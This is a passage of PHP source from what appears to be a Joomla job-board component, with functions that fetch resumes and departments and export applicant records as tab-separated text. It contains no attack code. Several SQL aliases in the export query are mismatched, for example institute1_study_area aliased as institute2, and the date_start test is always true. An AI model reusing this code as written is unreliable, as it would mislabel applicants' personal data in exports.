		WHERE  company.id = " . $companyid;
        $db->setQuery($query);
        $result[0] = $db->loadObject();
        $result[0]->multicity = $this->getMultiCityDataForView($companyid, 2);
        $result[3] = $this->getFieldsOrderingforForm(1);
        return $result;
    }

    function & getDepartmentById($c_id, $uid) {
        if ($uid)
            if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
                return false;
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();
        $status = array(
            '0' => array('value' => 0, 'text' => JText::_('JS_PENDDING')),
            '1' => array('value' => 1, 'text' => JText::_('JS_APPROVE')),
            '2' => array('value' => -1, 'text' => JText::_('JS_REJECT')),);

        $query = "SELECT department.*
		FROM `#__js_job_departments` AS department
		 WHERE department.id=" . $c_id;
        $db->setQuery($query);
        $department = $db->loadObject();
        if (!empty($department))
		if($department->uid != $uid) $uid  = $department->uid;
        $companies = $this->getCompanies($uid);
        if (isset($department)) {
            $lists['companies'] = JHTML::_('select.genericList', $companies, 'companyid', 'class="inputbox required" ' . '', 'value', 'text', $department->companyid);
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox " ' . '', 'value', 'text', $department->status);
        } else {
            $lists['companies'] = JHTML::_('select.genericList', $companies, 'companyid', 'class="inputbox required " ' . '', 'value', 'text', '');
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox " ' . '', 'value', 'text', '');
        }

        $result[0] = $department;
        $result[1] = $lists;
        return $result;
    }

    function &getResumeViewbyId($id) {
        if (is_numeric($id) == false)
            return false;
        $db = &$this->getDBO();
        $status = array(
            '0' => array('value' => 0, 'text' => JText::_('JS_PENDDING')),
            '1' => array('value' => 1, 'text' => JText::_('JS_APPROVE')),
            '2' => array('value' => -1, 'text' => JText::_('JS_REJECT')),);
        $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', '');
        $query = "SELECT app.* , cat.cat_title AS categorytitle, salary.rangestart, salary.rangeend, jobtype.title AS jobtypetitle
				,heighesteducation.title AS heighesteducationtitle
				, nationality_country.name AS nationalitycountry
				, address_city.name AS address_city2 , address_state.name AS address_state2 , address_country.name AS address_country
				, address1_city.name AS address1_city2 , address1_state.name AS address1_state2 , address1_country.name AS address1_country
				, address2_city.name AS address2_city2 , address2_state.name AS address2_state2 , address2_country.name AS address2_country
				, currency.symbol as symbol	
				FROM `#__js_job_resume` AS app
				JOIN `#__js_job_categories` AS cat ON app.job_category = cat.id
				JOIN `#__js_job_jobtypes` AS jobtype ON app.jobtype = jobtype.id
				LEFT JOIN `#__js_job_heighesteducation` AS heighesteducation ON app.heighestfinisheducation = heighesteducation.id
				LEFT JOIN `#__js_job_countries` AS nationality_country ON app.nationality = nationality_country.id
				LEFT JOIN `#__js_job_salaryrange` AS salary ON app.jobsalaryrange = salary.id
				LEFT JOIN `#__js_job_cities` AS address_city ON app.address_city = address_city.id
				LEFT JOIN `#__js_job_states` AS address_state ON address_city.stateid = address_state.id
				LEFT JOIN `#__js_job_countries` AS address_country ON address_city.countryid = address_country.id
				LEFT JOIN `#__js_job_cities` AS address1_city ON app.address1_city = address1_city.id
				LEFT JOIN `#__js_job_states` AS address1_state ON address1_city.stateid = address1_state.id
				LEFT JOIN `#__js_job_countries` AS address1_country ON address1_city.countryid = address1_country.id
				LEFT JOIN `#__js_job_cities` AS address2_city ON app.address2_city = address2_city.id
				LEFT JOIN `#__js_job_states` AS address2_state ON address2_city.stateid = address2_state.id
				LEFT JOIN `#__js_job_countries` AS address2_country ON address2_city.countryid = address2_country.id
				LEFT JOIN `#__js_job_currencies` AS currency ON currency.id = app.currencyid

				WHERE app.id = " . $id;
        $query2 = "SELECT app.id
				, institute_city.name AS institute_city2 , institute_state.name AS institute_state2 , institute_country.name AS institute_country
				, institute1_city.name AS institute1_city2 , institute1_state.name AS institute1_state2 , institute1_country.name AS institute1_country
				, institute2_city.name AS institute2_city2 , institute2_state.name AS institute2_state2 , institute2_country.name AS institute2_country
				, institute3_city.name AS institute3_city2 , institute3_state.name AS institute3_state2 , institute3_country.name AS institute3_country

				, employer_city.name AS employer_city2 , employer_state.name AS employer_state2 , employer_country.name AS employer_country
				, employer1_city.name AS employer1_city2 , employer1_state.name AS employer1_state2 , employer1_country.name AS employer1_country
				, employer2_city.name AS employer2_city2 , employer2_state.name AS employer2_state2 , employer2_country.name AS employer2_country
				, employer3_city.name AS employer3_city2 , employer3_state.name AS employer3_state2 , employer3_country.name AS employer3_country
				FROM `#__js_job_resume` AS app
				LEFT JOIN `#__js_job_cities` AS institute_city ON app.institute_city = institute_city.id
				LEFT JOIN `#__js_job_states` AS institute_state ON institute_city.stateid = institute_state.id
				LEFT JOIN `#__js_job_countries` AS institute_country ON institute_city.countryid = institute_country.id
				LEFT JOIN `#__js_job_cities` AS institute1_city ON app.institute1_city = institute1_city.id
				LEFT JOIN `#__js_job_states` AS institute1_state ON institute1_city.stateid = institute1_state.id
				LEFT JOIN `#__js_job_countries` AS institute1_country ON institute1_city.countryid = institute1_country.id
				LEFT JOIN `#__js_job_cities` AS institute2_city ON app.institute2_city = institute2_city.id
				LEFT JOIN `#__js_job_states` AS institute2_state ON institute2_city.stateid = institute2_state.id
				LEFT JOIN `#__js_job_countries` AS institute2_country ON institute2_city.countryid = institute2_country.id
				LEFT JOIN `#__js_job_cities` AS institute3_city ON app.institute3_city = institute3_city.id
				LEFT JOIN `#__js_job_states` AS institute3_state ON institute3_city.stateid = institute3_state.id
				LEFT JOIN `#__js_job_countries` AS institute3_country ON institute3_city.countryid = institute3_country.id

				LEFT JOIN `#__js_job_cities` AS employer_city ON app.employer_city = employer_city.id
				LEFT JOIN `#__js_job_states` AS employer_state ON employer_city.stateid = employer_state.id
				LEFT JOIN `#__js_job_countries` AS employer_country ON employer_city.countryid = employer_country.id
				LEFT JOIN `#__js_job_cities` AS employer1_city ON app.employer1_city = employer1_city.id
				LEFT JOIN `#__js_job_states` AS employer1_state ON employer1_city.stateid = employer1_state.id
				LEFT JOIN `#__js_job_countries` AS employer1_country ON employer1_city.countryid = employer1_country.id
				LEFT JOIN `#__js_job_cities` AS employer2_city ON app.employer2_city = employer2_city.id
				LEFT JOIN `#__js_job_states` AS employer2_state ON employer2_city.stateid = employer2_state.id
				LEFT JOIN `#__js_job_countries` AS employer2_country ON employer2_city.countryid = employer2_country.id
				LEFT JOIN `#__js_job_cities` AS employer3_city ON app.employer3_city = employer3_city.id
				LEFT JOIN `#__js_job_states` AS employer3_state ON employer3_city.stateid = employer3_state.id
				LEFT JOIN `#__js_job_countries` AS employer3_country ON employer3_city.countryid = employer3_country.id

				WHERE app.id = " . $id;

        $db->setQuery('SET SQL_BIG_SELECTS=1');
        $db->query();

        $db->setQuery($query);
        $resume = $db->loadObject();

        $db->setQuery($query2);
        $resume2 = $db->loadObject();

        $result[0] = $resume;
        $result[1] = $resume2;
        $result[2] = $this->getResumeViewbyId3($id);
        $result[3] = $this->getFieldsOrderingforForm(3); // resume fields
        $result[4] = $lists;
        return $result;
    }

    function &getResumeViewbyId3($id) {
        if (is_numeric($id) == false)
            return false;
        $db = &$this->getDBO();
        $query = "SELECT app.id
				, reference_city.name AS reference_city2 , reference_state.name AS reference_state2 , reference_country.name AS reference_country
				, reference1_city.name AS reference1_city2 , reference1_state.name AS reference1_state2 , reference1_country.name AS reference1_country
				, reference2_city.name AS reference2_city2 , reference2_state.name AS reference2_state2 , reference2_country.name AS reference2_country
				, reference3_city.name AS reference3_city2 , reference3_state.name AS reference3_state2 , reference3_country.name AS reference3_country

				FROM `#__js_job_resume` AS app
				LEFT JOIN `#__js_job_cities` AS reference_city ON app.reference_city = reference_city.id
				LEFT JOIN `#__js_job_states` AS reference_state ON reference_city.stateid = reference_state.id
				LEFT JOIN `#__js_job_countries` AS reference_country ON reference_city.countryid = reference_country.id
				LEFT JOIN `#__js_job_cities` AS reference1_city ON app.reference1_city = reference1_city.id
				LEFT JOIN `#__js_job_states` AS reference1_state ON reference1_city.stateid = reference1_state.id
				LEFT JOIN `#__js_job_countries` AS reference1_country ON reference1_city.countryid = reference1_country.id
				LEFT JOIN `#__js_job_cities` AS reference2_city ON app.reference2_city = reference2_city.id
				LEFT JOIN `#__js_job_states` AS reference2_state ON reference2_city.stateid = reference2_state.id
				LEFT JOIN `#__js_job_countries` AS reference2_country ON reference2_city.countryid = reference2_country.id
				LEFT JOIN `#__js_job_cities` AS reference3_city ON app.reference3_city = reference3_city.id
				LEFT JOIN `#__js_job_states` AS reference3_state ON reference3_city.stateid = reference3_state.id
				LEFT JOIN `#__js_job_countries` AS reference3_country ON reference3_city.countryid = reference3_country.id

				WHERE app.id = " . $id;
        $db->setQuery($query);
        $resume = $db->loadObject();
        return $resume;
    }

    function & getStatebyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_states WHERE id = " . $c_id;
        $db->setQuery($query);
        $state = $db->loadObject();
        return $state;
    }

    /* STRAT EXPORT RESUMES */
    function setAllExport($jobid) {
        $db = &$this->getDBO();
        if (is_numeric($jobid) == false)
            return false;
        if (($jobid == 0) || ($jobid == ''))
            return false;
        //for job title
        $query = "SELECT title FROM `#__js_job_jobs` WHERE id = " . $jobid;
        $db->setQuery($query);
        $jobtitle = $db->loadResult();

        $result = $this->getExportAllResumesByJobId($jobid);
        $result = $db->loadAssocList();
        if (!$result) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        } else {
            $result = $this->makeArrayForExport($result);
            // Empty data vars
            $data = "";
            // We need tabbed data
            $sep = "\t";
            $fields = (array_keys($result[0]));
            // Count all fields(will be the collumns
            $columns = count($fields);
            $data .= "Job Title" . $sep . $jobtitle . "\n";
            // Put the name of all fields to $out.
            for ($i = 0; $i < $columns; $i++) {
                $data .= $fields[$i] . $sep;
            }
            $data .= "\n";
            // Counting rows and push them into a for loop
            for ($k = 0; $k < count($result); $k++) {
                $row = $result[$k];
                $line = '';
                // Now replace several things for MS Excel
                foreach ($row as $value) {
                    $value = str_replace('"', '""', $value);
                    $line .= '"' . $value . '"' . "\t";
                }
                $data .= trim($line) . "\n";
            }
            $data = str_replace("\r", "", $data);
            // If count rows is nothing show o records.
            if (count($result) == 0) {
                $data .= "\n(0) Records Found!\n";
            }
            return $data;
        }
    }

    function setExport($jobid, $resumeid) {
        $db = &$this->getDBO();
        if (is_numeric($jobid) == false)
            return false;
        if (($jobid == 0) || ($jobid == ''))
            return false;

        $result = $this->getExportResumes($jobid, $resumeid);

        $result = $db->loadAssocList();
        if (!$result) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        } else {
            $result = $this->makeArrayForExport($result);
            // Empty data vars
            $data = "";
            // We need tabbed data
            $sep = "\t";
            $fields = (array_keys($result[0]));
            // Count all fields(will be the collumns
            $columns = count($fields);
            // Put the name of all fields to $out. 
            for ($i = 0; $i < $columns; $i++) {
                $data .= $fields[$i] . $sep;
            }
            $data .= "\n";
            // Counting rows and push them into a for loop
            for ($k = 0; $k < count($result); $k++) {
                $row = $result[$k];
                $line = '';
                // Now replace several things for MS Excel
                foreach ($row as $value) {
                    $value = str_replace('"', '""', $value);
                    $line .= '"' . $value . '"' . "\t";
                }
                $data .= trim($line) . "\n";
            }
            $data = str_replace("\r", "", $data);
            // If count rows is nothing show o records.
            if (count($result) == 0) {
                $data .= "\n(0) Records Found!\n";
            }
            return $data;
        }
    }

    function makeArrayForExport($result) {
        foreach ($result as $r) {
            $myarr['Application Title'] = $r['application_title'];
            $myarr['First Name'] = $r['first_name'];
            $myarr['Last Name'] = $r['last_name'];
            $myarr['Middle Name'] = $r['middle_name'];
            $myarr['Range Start'] = $r['rangestart'];
            $myarr['Heighest Education Title'] = $r['heighesteducationtitle'];
			if($r['gender'] == 1) $myarr['Gender'] =  JText::_('JS_MALE'); elseif($r['gender'] == 2) $myarr['Gender'] = JText::_('JS_FEMALE');else $myarr['Gender'] = JText::_('JS_DOES_NOT_MATTER');
            $myarr['Email Address'] = $r['email_address'];
            $myarr['Home Phone'] = $r['home_phone'];
            $myarr['Work Phone'] = $r['work_phone'];
            $myarr['Cell'] = $r['cell'];
            $myarr['I\'am Available'] = $r['iamavailable'];
			if($r['searchable'] == 1) $myarr['Searchable'] = JText::_('JS_YES');else $myarr['Searchable'] = JText::_('JS_NO');
            $myarr['Job Category'] = $r['categorytitle'];
            $myarr['Job Salaryrange'] = $r['rangestart'] . '-' . $r['rangeend'];
            $myarr['Jobtype'] = $r['jobtypetitle'];
		if($r['address_city2']) $myarr['Address City'] =$r['address_city2']; else $myarr['Address City'] =$r['address_city'];
		if($r['address_state2']) $myarr['Address State'] = $r['address_state2']; else $myarr['Address State'] = $r['address_state'];
		if($r['address_country2']) $myarr['Address Country'] = $r['address_country2']; else $myarr['Address Country'] = $r['address_country'];
            $myarr['Address Zipcode'] = $r['address_zipcode'];
            $myarr['Address'] = $r['address'];
            $myarr['Institute'] = $r['institute'];
		if($r['institute_city2']) $myarr['Institute City'] = $r['institute_city2']; else $myarr['Institute City'] = $r['institute_city'];
		if($r['institute_state2']) $myarr['Institute State'] = $r['institute_state2']; else $myarr['Institute State'] = $r['institute_state'];
		if($r['institute_country2']) $myarr['Institute Country'] = $r['institute_country2']; else $myarr['Institute Country'] = $r['institute_country'];
            $myarr['Institute_address'] = $r['institute_address'];
            $myarr['Institute Certificate Name'] = $r['institute_certificate_name'];
            $myarr['Institute Study Area'] = $r['institute_study_area'];
            $myarr['Employer'] = $r['employer'];
            $myarr['Employer Position'] = $r['employer_position'];
            $myarr['Employer Resp'] = $r['employer_resp'];
            $myarr['Employer Pay Upon Leaving'] = $r['employer_pay_upon_leaving'];
            $myarr['Employer Supervisor'] = $r['employer_supervisor'];
            $myarr['Employer From Date'] = $r['employer_from_date'];
            $myarr['Employer To Date'] = $r['employer_to_date'];
            $myarr['Employer Leave Reason'] = $r['employer_leave_reason'];
		if($r['employer_city2']) $myarr['Employer City'] = $r['employer_city2']; else $myarr['Employer City'] = $r['employer_city'];
		if($r['employer_state2']) $myarr['Employer State'] = $r['employer_state2']; else $myarr['Employer State'] = $r['employer_state'];
		if($r['employer_country2']) $myarr['Employer Country'] = $r['employer_country2']; else $myarr['Employer Country'] = $r['employer_country'];
            $myarr['Employer Zip'] = $r['employer_zip'];
            $myarr['Employer Phone'] = $r['employer_phone'];
            $myarr['Employer Address'] = $r['employer_address'];
            $myarr['Institute-1'] = $r['institute1'];
		if($r['institute1_city2']) $myarr['Institute-1 City'] = $r['institute1_city2']; else $myarr['Institute-1 city'] = $r['institute1_city'];
		if($r['institute1_state2']) $myarr['Institute-1 State'] = $r['institute1_state2']; else $myarr['Institute-1 State'] = $r['institute1_state'];
		if($r['institute1_country2']) $myarr['Institute-1 Country'] = $r['institute1_country2']; else $myarr['Institute-1 Country'] = $r['institute1_country'];
            $myarr['Institute-1 Address'] = $r['institute1_address'];
            $myarr['Institute-1 Certificate Name'] = $r['institute1_certificate_name'];
            $myarr['Institute-2'] = $r['institute2'];
		if($r['institute2_city2']) $myarr['Institute-2 City'] = $r['institute2_city2']; else $myarr['Institute-2 City'] = $r['institute2_city'];
		if($r['institute2_state2']) $myarr['Institute-2 State'] = $r['institute2_state2']; else $myarr['Institute-2 State'] = $r['institute2_state'];
		if($r['institute2_country2']) $myarr['Institute-2 Country'] = $r['institute2_country2']; else $myarr['Institute-2 Country'] = $r['institute2_country'];
    $myarr['Institute-2 Address'] = $r['institute2_address'];
            $myarr['Institute-2 Certificate Name'] = $r['institute2_certificate_name'];
            $myarr['Institute-2 Study Area'] = $r['institute2_study_area'];
            $myarr['Institute-3'] = $r['institute3'];
		if($r['institute3_city2']) $myarr['Institute-3 City'] = $r['institute3_city2']; else $myarr['Institute-3 City'] = $r['institute3_city'];
		if($r['institute3_state2']) $myarr['Institute-3 State'] = $r['institute3_state2']; else $myarr['Institute-3 State'] = $r['institute3_state'];
		if($r['institute3_country2']) $myarr['Institute-3 Country'] = $r['institute3_country2']; else $myarr['Institute-3 Country'] = $r['institute3_country'];
            $myarr['Institute-3 Address'] = $r['institute3_address'];
            $myarr['Institute-3 Study Area'] = $r['institute3_study_area'];
            $myarr['Employer-1'] = $r['employer1'];
            $myarr['Employer-1 Position'] = $r['employer1_position'];
            $myarr['Employer-1 Resp'] = $r['employer1_resp'];
            $myarr['Employer-1 Pay Upon Leaving'] = $r['employer1_pay_upon_leaving'];
            $myarr['Employer-1 Supervisor'] = $r['employer1_supervisor'];
            $myarr['Employer-1 From Date'] = $r['employer1_from_date'];
            $myarr['Employer-1 To Date'] = $r['employer1_to_date'];
		if($r['employer1_city2']) $myarr['Employer-1 City'] = $r['employer1_city2']; else $myarr['Employer-1 City'] = $r['employer1_city'];
		if($r['employer1_state2']) $myarr['Employer-1 State'] = $r['employer1_state2']; else $myarr['Employer-1 State'] = $r['employer1_state'];
		if($r['employer1_country2']) $myarr['Employer-1 Country'] = $r['employer1_country2']; else $myarr['Employer-1 Country'] = $r['employer1_country'];
            $myarr['Employer-1 Zip'] = $r['employer1_zip'];
            $myarr['Employer-1 Phone'] = $r['employer1_phone'];
            $myarr['Employer-1 Address'] = $r['employer1_address'];
            $myarr['Employer-2'] = $r['employer2'];
            $myarr['Employer-2 Position'] = $r['employer2_position'];
            $myarr['Employer-2 Resp'] = $r['employer2_resp'];
            $myarr['Employer-2 Pay Upon Leaving'] = $r['employer2_pay_upon_leaving'];
            $myarr['Employer-2 Supervisor'] = $r['employer2_supervisor'];
            $myarr['Employer-2 From Date'] = $r['employer2_from_date'];
            $myarr['Employer-2 To Date'] = $r['employer2_to_date'];
            $myarr['Employer-2 Leave Reason'] = $r['employer2_leave_reason'];
		if($r['employer2_city2']) $myarr['Employer-2 City'] = $r['employer2_city2']; else $myarr['Employer-2 City'] = $r['employer2_city'];
		if($r['employer2_state2']) $myarr['Employer-2 State'] = $r['employer2_state2']; else $myarr['Employer-2 State'] = $r['employer2_state'];
		if($r['employer2_country2']) $myarr['Employer-2 Country'] = $r['employer2_country2']; else $myarr['Employer-2 Country'] = $r['employer2_country'];
            $myarr['Employer-2 Zip'] = $r['employer2_zip'];
            $myarr['Employer-2 Address'] = $r['employer2_address'];
            $myarr['Employer-2 Phone'] = $r['employer2_phone'];
            $myarr['Employer-3'] = $r['employer3'];
            $myarr['Employer-3 Position'] = $r['employer3_position'];
            $myarr['Employer-3 Resp'] = $r['employer3_resp'];
            $myarr['Employer-3 Pay Upon Leaving'] = $r['employer3_pay_upon_leaving'];
            $myarr['Employer-3 Supervisor'] = $r['employer3_supervisor'];
            $myarr['Employer-3 From Date'] = $r['employer3_from_date'];
            $myarr['Employer-3 To Date'] = $r['employer3_to_date'];
            $myarr['Employer-3 Leave Reason'] = $r['employer3_leave_reason'];
		if($r['employer3_city2']) $myarr['Employer-3 City'] = $r['employer3_city2']; else $myarr['Employer-3 City'] = $r['employer3_city'];
		if($r['employer3_state2']) $myarr['Employer-3 State'] = $r['employer3_state2']; else $myarr['Employer-3 State'] = $r['employer3_state'];
		if($r['employer3_country2']) $myarr['Employer-3 Country'] = $r['employer3_country2']; else $myarr['Employer-3 Country'] = $r['employer3_country'];
            $myarr['Employer-3 Zip'] = $r['employer3_zip'];
            $myarr['Employer-3 Phone'] = $r['employer3_phone'];
            $myarr['Langugage Reading'] = $r['langugage_reading'];
            $myarr['Langugage Writing'] = $r['langugage_writing'];
            $myarr['Langugage Undarstanding'] = $r['langugage_undarstanding'];
            $myarr['Langugage Where Learned'] = $r['langugage_where_learned'];
            $myarr['Language-1'] = $r['language1'];
            $myarr['Langugage-1 Reading'] = $r['langugage1_reading'];
            $myarr['Langugage-1 Writing'] = $r['langugage1_writing'];
            $myarr['Langugage-1 Undarstanding'] = $r['langugage1_undarstanding'];
            $myarr['Langugage-1 Where Learned'] = $r['langugage1_where_learned'];
            $myarr['Language-2'] = $r['language2'];
            $myarr['Langugage-2 Reading'] = $r['langugage2_reading'];
            $myarr['Langugage-2 Writing'] = $r['langugage2_writing'];
            $myarr['Langugage-2 Undarstanding'] = $r['langugage2_undarstanding'];
            $myarr['Langugage-2 Where Learned'] = $r['langugage2_where_learned'];
            $myarr['Language-3'] = $r['language3'];
            $myarr['Langugage-3 Reading'] = $r['langugage3_reading'];
            $myarr['Langugage-3 Writing'] = $r['langugage3_writing'];
            $myarr['Langugage-3 Undarstanding'] = $r['langugage3_undarstanding'];
            $myarr['Langugage-3 Where Learned'] = $r['langugage3_where_learned'];
			if($r['date_start'] != '0000-00-00 00:00:00' || $r['date_start'] != '') $myarr['Date Start'] = $r['date_start'];else $myarr['Date Start'] ='';
            $myarr['Desired Salary'] = $r['desired_salary'];
            $myarr['Can Work'] = $r['can_work'];
            $myarr['Available'] = $r['available'];
            $myarr['Unalailable'] = $r['unalailable'];
            $myarr['Total Experience'] = $r['totalexperience'];
            $myarr['Skills'] = $r['skills'];
            $myarr['Driving License'] = $r['driving_license'];
            $myarr['License No'] = $r['license_no'];
            $myarr['License Country'] = $r['license_country'];
            $myarr['Reference'] = $r['reference'];
            $myarr['Reference Name'] = $r['reference_name'];
		if($r['reference_city2']) $myarr['Reference City'] = $r['reference_city2']; else $myarr['Reference City'] = $r['reference_city'];
		if($r['reference_state2']) $myarr['Reference State'] = $r['reference_state2']; else $myarr['Reference State'] = $r['reference_state'];
		if($r['reference_country2']) $myarr['Reference Country'] = $r['reference_country2']; else $myarr['Reference Country'] = $r['reference_country'];
            $myarr['Reference Zipcode'] = $r['reference_zipcode'];
            $myarr['Reference Address'] = $r['reference_address'];
            $myarr['Reference Phone'] = $r['reference_phone'];
            $myarr['Reference Relation'] = $r['reference_relation'];
            $myarr['Reference Years'] = $r['reference_years'];
            $myarr['Reference-1'] = $r['reference1'];
            $myarr['Reference-1 Name'] = $r['reference1_name'];
		if($r['reference1_city2']) $myarr['Reference-1 City'] = $r['reference1_city2']; else $myarr['Reference-1 City'] = $r['reference1_city'];
		if($r['reference1_state2']) $myarr['Reference-1 State'] = $r['reference1_state2']; else $myarr['Reference-1 State'] = $r['reference1_state'];
		if($r['reference1_country2']) $myarr['Reference-1 Country'] = $r['reference1_country2']; else $myarr['Reference-1 Country'] = $r['reference1_country'];
            $myarr['Reference-1 Address'] = $r['reference1_address'];
            $myarr['Reference-1 Phone'] = $r['reference1_phone'];
            $myarr['Reference-1 Relation'] = $r['reference1_relation'];
            $myarr['Reference-1 Years'] = $r['reference1_years'];
            $myarr['Reference-2'] = $r['reference2'];
            $myarr['Reference-2 Name'] = $r['reference2_name'];
            $myarr['Reference-2 Country'] = $r['reference2_country'];
            $myarr['Reference-2 State'] = $r['reference2_state'];
            $myarr['Reference-2 City'] = $r['reference2_city'];
            $myarr['Reference-2 Address'] = $r['reference2_address'];
            $myarr['Reference-2 Phone'] = $r['reference2_phone'];
            $myarr['Reference-2 Relation'] = $r['reference2_relation'];
            $myarr['Reference-2 Years'] = $r['reference2_years'];
            $myarr['Reference-3'] = $r['reference3'];
            $myarr['Reference-3 Name'] = $r['reference3_name'];
            $myarr['Reference-3 Country'] = $r['reference3_country'];
            $myarr['Reference-3 State'] = $r['reference3_state'];
            $myarr['Reference-3 City'] = $r['reference3_city'];
            $myarr['Reference-3 Address'] = $r['reference3_address'];
            $myarr['Reference-3 Phone'] = $r['reference3_phone'];
            $myarr['Reference-3 Relation'] = $r['reference3_relation'];
            $myarr['Reference-3 Years'] = $r['reference3_years'];
		if($r['address1_city2']) $myarr['Address-1 City'] = $r['address1_city2']; else $myarr['Address-1 City'] = $r['address1_city'];
		if($r['address1_state2']) $myarr['Address-1 State'] = $r['address1_state2']; else $myarr['Address-1 State'] = $r['address1_state'];
		if($r['address1_country2']) $myarr['Address-1 Country'] = $r['address1_country2']; else $myarr['Address-1 Country'] = $r['address1_country'];
            $myarr['Address-1 Zipcode'] = $r['address1_zipcode'];
            $myarr['Address-1'] = $r['address1'];
		if($r['address2_city2']) $myarr['Address-2 City'] = $r['address2_city2']; else $myarr['Address-2 City'] = $r['address2_city'];
		if($r['address2_state2']) $myarr['Address-2 State'] = $r['address2_state2']; else $myarr['Address-2 State'] = $r['address2_state'];
		if($r['address2_country2']) $myarr['Address-2 Country'] = $r['address2_country2']; else $myarr['Address-2 Country'] = $r['address2_country'];
            $myarr['Address-2 Zipcode'] = $r['address2_zipcode'];
            $myarr['Address-2'] = $r['address2'];
            $myarr['Reference-1 Zipcode'] = $r['reference1_zipcode'];
            $myarr['Reference-2 Zipcode'] = $r['reference2_zipcode'];
            $myarr['Reference-3 Zipcode'] = $r['reference3_zipcode'];
            $myarr['Apply Date'] = $r['apply_date'];
            $myarr['Comments'] = $r['comments'];

            $returnvalue[] = $myarr;
        }
        return $returnvalue;
    }
    /* END EXPORT RESUMES */

    function getExportAllResumesByJobId($jobid) {
        if(!is_numeric($jobid)) return false;
        $db = &$this->getDBO();
        $query = "SELECT resume.*,applyjob.apply_date AS apply_date,applyjob.comments AS comments,cat.cat_title AS categorytitle,salary.rangestart AS rangestart,salary.rangeend AS rangeend,jobtype.title AS jobtypetitle,heighesteducation.title AS heighesteducationtitle,
                            nationality_country.name AS nationalitycountry,address_city.name AS address_city2,address_state.name AS address_state2,
                            address_country.name AS address_country2,address1_city.name AS address1_city2,address1_state.name AS address1_state2,
                            address1_country.name AS address1_country2,address2_city.name AS address2_city2,address2_state.name AS address2_state2,
                            address2_country.name AS address2_country2,institute_city.name AS institute_city2,institute_state.name AS institute_state2,
                            institute_country.name AS institute_country2,institute1_city.name AS institute1_city2,institute1_state.name AS institute1_state2,
                            institute1_country.name AS institute1_country2,institute2_city.name AS institute2_city2,institute2_state.name AS institute2_state2,
                            institute2_country.name AS institute2_country2,institute3_city.name AS institute3_city2,institute3_state.name AS institute3_state2,
                            institute3_country.name AS institute3_country2,employer_city.name AS employer_city2,employer_state.name AS employer_state2,
                            employer_country.name AS employer_country2,employer1_city.name AS employer1_city2,employer1_state.name AS employer1_state2,
                            employer1_country.name AS employer1_country2,employer2_city.name AS employer2_city2,employer2_state.name AS employer2_state2,
                            employer2_country.name AS employer2_country2,employer3_city.name AS employer3_city2,employer3_state.name AS employer3_state2,
                            employer3_country.name AS employer3_country2,reference_city.name AS reference_city2,reference_state.name AS reference_state2,
                            reference_country.name AS reference_country2,reference1_city.name AS reference1_city2,reference1_state.name AS reference1_state2,
                            reference1_country.name AS reference1_country2,resume.id AS id,resume.uid AS uid,resume.application_title AS application_title,resume.first_name AS first_name,
                            resume.last_name AS last_name,resume.middle_name AS middle_name,resume.gender AS gender,resume.email_address AS email_address,resume.home_phone AS home_phone,resume.work_phone AS work_phone,
                            resume.cell AS cell,resume.nationality AS iamavailable,resume.searchable AS searchable,resume.photo AS photo,resume.job_category AS job_category,resume.jobsalaryrange AS jobsalaryrange,
                            resume.jobtype AS jobtype,resume.heighestfinisheducation AS heighestfinisheducation,resume.address_country AS address_country,resume.address_state AS address_state,resume.address_city AS address_city,
                            resume.address_zipcode AS address_zipcode,resume.address AS address,resume.institute AS institute,resume.institute_country AS institute_country,resume.institute_state AS institute_state,
                            resume.institute_city AS institute_city,resume.institute_address AS institute_address,resume.institute_certificate_name AS institute_certificate_name,
                            resume.institute_study_area AS institute_study_area,resume.employer AS employer,resume.employer_position AS employer_position,resume.employer_resp AS employer_resp,resume.employer_pay_upon_leaving AS employer_pay_upon_leaving,
                            resume.employer_supervisor AS employer_supervisor,resume.employer_from_date AS employer_from_date,resume.employer_to_date AS employer_to_date,resume.employer_leave_reason AS employer_leave_reason,resume.employer_country AS employer_country,
                            resume.employer_state AS employer_state,resume.employer_city AS employer_city,resume.employer_zip AS employer_zip,resume.employer_phone AS employer_phone,resume.employer_address AS employer_address,
                            resume.institute1 AS institute1,resume.institute1_country AS institute1_country,resume.institute1_state AS institute1_state,resume.institute1_city AS institute1_city,resume.institute1_address AS institute1_address,
                            resume.institute1_certificate_name AS institute1_certificate_name,resume.institute1_study_area AS institute2,resume.institute2_country AS institute2_country,resume.institute2_state AS institute2_state,resume.institute2_city AS institute2_city,
                            resume.institute2_address AS institute2_address,resume.institute2_certificate_name AS institute2_certificate_name,resume.institute2_study_area AS institute2_study_area,resume.institute3 AS institute3,resume.institute3_country AS institute3_country,resume.institute3_state AS institute3_state,
                            resume.institute3_city AS institute3_city,resume.institute3_address AS institute3_address,resume.institute3_study_area AS institute3_study_area,resume.institute3_certificate_name AS employer1,resume.employer1_position AS employer1_position,
                            resume.employer1_resp AS employer1_resp,resume.employer1_pay_upon_leaving AS employer1_pay_upon_leaving,resume.employer1_supervisor AS employer1_supervisor,resume.employer1_from_date AS employer1_from_date,resume.employer1_to_date AS employer1_to_date,resume.employer1_leave_reason AS employer1_country,
                            resume.employer1_state AS employer1_state,resume.employer1_city AS employer1_city,resume.employer1_zip AS employer1_zip,resume.employer1_phone AS employer1_phone,resume.employer1_address AS employer1_address,resume.employer2 AS employer2,resume.employer2_position AS employer2_position,
                            resume.employer2_resp AS employer2_resp,resume.employer2_pay_upon_leaving AS employer2_pay_upon_leaving,resume.employer2_supervisor AS employer2_supervisor,resume.employer2_from_date AS employer2_from_date,resume.employer2_to_date AS employer2_to_date,resume.employer2_leave_reason AS employer2_leave_reason,resume.employer2_country AS employer2_country,
                            resume.employer2_state AS employer2_state,resume.employer2_city AS employer2_city,resume.employer2_zip AS employer2_zip,resume.employer2_address AS employer2_address,resume.employer2_phone AS employer2_phone,resume.employer3 AS employer3,resume.employer3_position AS employer3_position,resume.employer3_resp AS employer3_resp,
